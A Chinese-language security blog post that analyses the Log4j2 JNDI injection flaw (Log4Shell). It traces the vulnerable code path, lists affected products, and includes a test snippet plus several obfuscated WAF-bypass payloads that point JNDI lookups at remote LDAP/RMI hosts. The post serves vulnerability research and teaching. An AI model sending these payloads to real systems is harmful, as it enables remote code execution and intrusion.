---
title: "log4j2 漏洞"
onlyTitle: true
date: 2025-3-6 20:58:15
categories:
- java
- 框架漏洞
tags:
- log4j
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8135.jpg
---



# log4j漏洞

 Log4j  漏洞在安全圈引起了轩然大波，可以说是核弹级别的漏洞，无论是渗透、研发、安服、研究，所有人都在学习和复现这个漏洞，由于其覆盖面广，引用次数庞大，直接成为可以与永恒之蓝齐名的顶级可利用漏洞，官方 CVSS 评分更是直接顶到 10.0，国内有厂商将其命名为“毒日志”，国外将其命名为 Log4Shell。

## 漏洞影响版本

Apache Log4j 2.x<=2.14.1

pom.xml：

```xml
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.1</version>
</dependency>
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-api</artifactId>
    <version>2.14.1</version>
</dependency>
```

其他什么都不需要

跑一个漏洞test：

```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class log4jtest {
    private static final Logger logger = LogManager.getLogger(log4jtest.class);
    public static void main(String[] args) {
        logger.error("${jndi:ldap://127.0.0.1:8085/qlAnftyN}");
    }
}
```

中间是jndi注入地址

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250306153342385.png)

既然是jndi注入，那就只适用jdk<8u191的版本，更高也可以用高版本jndi的方式进行绕过

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250306155055781.png)

这种直接注入型的漏洞及其适合自动化，简单收益高。github随便搜一个都能开扫

https://github.com/fullhunt/log4j-scan

而且工具还集成了各种bypass姿势，所以绕过方式也不再介绍

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250306155549408.png)

说实话不是很想分析这个洞，因为能打就能打，不能打也就算了，也改不出什么花的payload。所以本次偷个懒，不再分析Apache Struts2、Apache Solr、Apache Druid、Apache Flink、ElasticSearch、VCenter 等等产品中涉及到的log4j漏洞。如果需要查找漏洞范围，可以自行上maven查看依赖链

## 漏洞分析

### 字符串处理

通常情况下我们是使用`LogManager.getLogger()`方法来获取一个 logger 对象，然后通过调用 logger 对象的 debug/info/error/warn/fatal/trace/log 等方法记录日志等信息

getLogger返回的是个Logger对象，该类继承了抽象类AbstractLogger

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250306162950669.png)

所以在debug/info/error/warn/fatal/trace/log这些方法中，都会先使用`AbstractLogger#logIfEnabled`的若干重载方法。

这些方法都会根据当前配置文件中的配置信息（参考如下文件）中记录的日志等级，来判断是否需要输出 console 以及日志记录文件，log4j 中的日志记录等级默认如下： ALL < DEBUG < INFO < WARN < ERROR < FATAL < OFF  ，默认输出的是 WARN/ERROR/FATAL  等级的日志信息

比如上面测试所用代码`logger.error`对应的level就是ERROR

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250306171913993.png)

注意！假如你的log level开启的ERROR，则ERROR之前的`ALL 、 DEBUG 、 INFO 、 WARN`都不会触发漏洞，而`ERROR 、 FATAL `都可以

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250306205016246.png)

修改level代码如下：

```java
LoggerContext ctx          = (LoggerContext) LogManager.getContext(false);
Configuration config       = ctx.getConfiguration();
LoggerConfig  loggerConfig = config.getLoggerConfig(LogManager.ROOT_LOGGER_NAME);
loggerConfig.setLevel(Level.ALL);
ctx.updateLoggers();
```

而漏洞链就从`AbstractLogger#logIfEnabled`开始，LEVEL.ALL模式下debug/info/error/warn/fatal/trace所有方法都会触发漏洞

由于已知漏洞触发点为jndi，也就是InitialContext.lookup，所以断点也一步打到位，得到如下调用栈

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250306163545174.png)

前面一大段都是配置的过程，直接看到MessagePatternConverter.format

锁定到format函数的if块，如果config不为空且noLookups为false，则遍历workingBuilder；如果workingBuilder内存在`${`，则截取`${`及其后面的内容，调用`config.getStrSubstitutor().replace()`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250306173144701.png)

变量栈里可以调出workingBuilder.value

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250306173847903.png)

经过format之后value如下

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250306174510277.png)

看一下noLookups在哪赋的值，因为后面修复涉及了这个变量。在MessagePatternConverter构造函数中，对noLookups进行了赋值。注意是`||`操作，有一个为true则不能顺利运行

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250306174701067.png)

其中`Constants.FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS`来自getBooleanProperty

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250306175117357.png)

getBooleanProperty从环境变量environment中查找有无`log4j2.formatMsgNoLookups`，如果查找不到则默认为false

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250306175246684.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250306175252976.png)

这里肯定默认是没有的

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250306175729026.png)

另一个参数noLookupsIdx来自loadNoLookups(option)，这里可以看出nolookups可以通过自定义option的参数值去控制

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250306180241886.png)

默认情况下，进入StrSubstitutor.replace，跟进到StrSubstitutor.substitute

该函数内while遍历整个字符串，匹配前缀和后缀中间的字符串

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250306201051530.png)

可以看出前缀是`${`，后缀是`}`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250306201151850.png)

于是分离出了中间的字符串

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250306201325950.png)

而且在分离后，还会有一个嵌套的substitute，用来处理套娃的情况

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250306201446671.png)

然后是一个if块套的for循环，解析变量表达式中的默认值分隔符（匹配`:-\关键字），并根据分隔符将变量名和默认值分开。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250306203240460.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250306201729450.png)

在没有匹配到变量赋值或处理结束后，将会调用 `resolveVariable` 方法解析满足 Lookup 功能的语法，将返回的结果替换回原字符串后，再次调用 `substitute` 方法进行递归解析。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250306202459090.png)

字符串替换的过程中可以看到，方法提供了一些特殊的写法，并支持递归解析。而这些特性，将会可以用来进行绕过 WAF。

在这里可以列举一些绕过姿势，让我们看看上面的字符串替换的妙用

比如下面就是一个嵌套解析，`${::-j}`解析得到j

```java
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://domain.com/j}
```

同理：

```java
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//domain.com/a}
```

同理：

```java
${${j:-j}${n:-n}${d:-d}${i:-i}:${r:-r}${m:-m}${i:-i}://127.0.0.1:1099/remoteImpl}
```

同理，我们可以构造`:\-`形式的绕过：

```java
${${J:\-J:-j}${N:\-N:-n}${D:\-D:-d}i:${RMI:-rmi}://127.0.0.1:1099/remoteImpl}
```

实测可用

### lookup

经过字符串处理后，调用了resolveVariable

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250306205914371.png)

resolveVariable内调用getVariableResolver获取了解析器，然后调用解析器的lookup

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250306210314043.png)

resolver实际上是Interpolator代理类，在构造函数填充了一堆Lookup器

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250306210557848.png)

在 2.14.0 版本中，默认是加入  log4j、sys、env、main、marker、java、lower、upper、jndi、jvmrunargs、spring、kubernetes、docker、web、date、ctx，由于部分功能的支持并不在 core 包中，所以如果加载不到对应的处理类，则会添加警告信息并跳过。而这些不同 Lookup  功能的支持，是随着版本更新的，例如在较低版本中，不存在 upper、lower 这两种功能，因此在使用时要注意环境。

在其lookup中，通过 `:` 作为分隔符来分隔 Lookup 关键字及参数，从`strLookupMap` 中根据关键字作为 key 匹配到对应的处理类，并调用其 lookup 方法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250306223353866.png)

所以你会在网上看到一个payload：

```java
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://domain.com/j}
```

并非如前面的`:-`赋值丢弃lower，而是把lower给解析了。此方法仅适用于2.14.0版本及以上，适用范围极其有限

回到lookup代码，由于我们传的`jndi:xxx`，所以取出前缀jndi，并取到JndiLookup查找器

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250306223721857.png)

跟进到JndiLookup.lookup，调用了JndiManager.getDefaultManager()获取jndiManager，然后调用其lookup方法。其实从变量信息已经能看出此处的jndiManager是InitialContext了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250306223936430.png)

可以看下getDefaultManager的具体过程，调用getManager，参数里的FACTORY是JndiManagerFactory

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250306224329338.png)

然后调用factory.createManager

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250306224435955.png)

实例化InitialContext并封装在JndiManager中返回

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250306224244175.png)

至此进入InitialContext触发JNDI漏洞

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250306224515608.png)



## 影响范围

copy一份 su18大佬的漏洞影响组件

### SpringBoot

默认情况下，Spring Boot 会用 Logback 来记录日志，并用 INFO 级别输出到控制台。也就是说，虽然包含了  Log4j2 的 jar 包，但是如果没有配置调用，是不会受到危害的。

但如果将日志框架修改为 Log4j2，则会受到此漏洞的影响，例如将配置文件改为如下格式：

```xml
<dependencies>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-web</artifactId>
        <exclusions>
            <exclusion>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-starter-logging</artifactId>
            </exclusion>
        </exclusions>
    </dependency>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-log4j2</artifactId>
        <version>2.6.1</version>
    </dependency>
</dependencies>
```

### Apache Struts2

Apache Struts2 使用了 Log4j2 作为日志组件，并且默认的日志等级为 Info，在目前官方最新的 showcase  2.5.28 版本中，引用了 2.12.1 的 log4j-core 以及 log4j-api 组件，是包含漏洞的版本，所以 Struts2  也在此次受影响的范围之内。

在且听安全公众号[发文](https://mp.weixin.qq.com/s/T-rcZnQxxUK1n2_lJNoUZg)中，披露了一处利用 `If-Modified-Since` header 解析异常调用 `LOG.warn()` 方法触发的姿势

### Apache Solr

Apache Solr 是 Apache Lucene 项目的开源企业搜索平台。其主要功能包括全文检索、命中标示、分面搜索、动态聚类、数据库集成，以及富文本（如 Word、PDF）的处理。当然也是此次漏洞的受害者。

官方通告：https://solr.apache.org/security.html#apache-solr-affected-by-apache-log4j-cve-2021-44228

Apache Solr 的 POC (source点位Collections）都已经传遍了世界，github一搜就有。

当然入口点也肯定不止这一个，只需要找到点就可以了。

### Elasticsearch

根据 Elasticsearch 在官方论坛里发布的公告，Elasticsearch 5.0.0+ 版本包含了带有漏洞版本的 Log4j2 包，但由于其使用了 Java Security Manager，减轻了受到的危害。

phith0n 师傅在知识星球上发布了其研究成果，经其实测发现，写入操作一般会写日志。并给出测试时 dnslog 的截图。

### vmware 产品线

根据 VMware 的[官方安全通告](https://www.vmware.com/security/advisories/VMSA-2021-0028.html)，包括 vCenter 在内的多个产品均受到了此次安全漏洞的影响，并且提供了受影响产品的环境的版本号。

### 其他

其他受影响组件还有很多很多



参考：

https://su18.org/post/log4j2/#springboot

https://www.freebuf.com/articles/web/312043.html